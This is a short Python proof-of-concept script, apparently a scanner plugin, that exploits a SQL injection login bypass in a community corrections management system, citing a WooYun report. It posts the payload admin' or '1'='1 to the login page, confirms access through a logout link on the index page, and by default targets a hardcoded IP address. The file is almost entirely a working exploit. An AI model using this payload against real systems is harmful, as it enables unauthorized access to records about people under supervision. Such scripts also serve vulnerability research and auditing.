#!/usr/bin/env python
# -*- coding: utf-8 -*-


"""
POC Name  :  社区矫正管理系统万能密码登录
References:  http://www.wooyun.org/bugs/wooyun-2015-0147553
Author    :  hfloveyy
"""

def assign(service, arg):
    if service == 'gooine_sqjz':
        return True, arg

def audit(arg):
    payload = 'username=admin%27+or+%271%27%3D%271&password=&verify='
    url = arg +'login.php?action=login'
    url2 = arg +'index.php'
    code, head, res, errcode, _ = curl.curl2(url,post = payload)
    if code ==302:
            code, head, res, errcode, _ = curl.curl2(url2)
            if code ==200 and 'login.php?action=logout' in res:
                security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('gooine_sqjz', 'http://221.180.167.127:88/')[1])